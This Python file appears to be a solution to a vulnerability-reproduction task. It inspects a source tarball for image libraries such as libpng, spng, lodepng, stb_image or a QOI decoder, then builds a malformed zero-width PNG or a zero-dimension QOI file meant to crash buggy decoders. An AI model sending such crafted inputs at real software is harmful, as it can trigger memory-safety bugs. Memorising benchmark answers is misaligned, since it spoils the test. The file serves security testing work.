import tarfile
import zlib
import struct


def _make_png_zero_width(height=256, color_type=6, bit_depth=8, interlace=0):
    def chunk(typ, data):
        typ_b = typ.encode('ascii')
        length = struct.pack(">I", len(data))
        crc = zlib.crc32(typ_b)
        crc = zlib.crc32(data, crc) & 0xffffffff
        return length + typ_b + data + struct.pack(">I", crc)

    # PNG signature
    png = bytearray(b"\x89PNG\r\n\x1a\n")

    # IHDR with width = 0, height > 0
    ihdr_data = struct.pack(">IIBBBBB", 0, height, bit_depth, color_type, 0, 0, interlace)
    png += chunk("IHDR", ihdr_data)

    # IDAT: for width=0, each scanline is only the filter byte (we'll use filter type 0)
    raw = b"\x00" * height
    comp = zlib.compress(raw)

    png += chunk("IDAT", comp)
    png += chunk("IEND", b"")
    return bytes(png)


def _make_qoi_zero_dim(pixels=64, channels=4):
    # QOI header: magic, width, height, channels, colorspace
    # width=0, height=1 (or 0) to trigger zero dimension
    width = 0
    height = 1
    header = b"qoif" + struct.pack(">II", width, height) + bytes([channels, 0])

    # Payload: emit some pixels even though dimensions are zero to provoke buggy decoders
    # Use QOI_OP_RGB (0xFE) followed by 3 bytes repeatedly
    payload = bytearray()
    for i in range(pixels):
        payload.append(0xFE)
        payload += bytes([(i * 3) & 0xFF, (i * 7) & 0xFF, (i * 11) & 0xFF])

    # QOI end marker (padding): 7x0x00 + 0x01
    end_marker = b"\x00" * 7 + b"\x01"
    return header + bytes(payload) + end_marker


class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt = "png"
        try:
            with tarfile.open(src_path, "r:*") as tf:
                names = [m.name.lower() for m in tf.getmembers()]
                # Prefer QOI if clearly present
                if any("qoi" in n for n in names):
                    fmt = "qoi"
                elif any(("spng" in n or "lodepng" in n or "libpng" in n or "/png" in n or n.endswith("png.h") or n.endswith("png.c")) for n in names):
                    fmt = "png"
                elif any("stb_image" in n or "stb_image.h" in n for n in names):
                    fmt = "png"
        except Exception:
            fmt = "png"

        if fmt == "qoi":
            return _make_qoi_zero_dim()
        return _make_png_zero_width(height=512, color_type=6, bit_depth=8, interlace=0)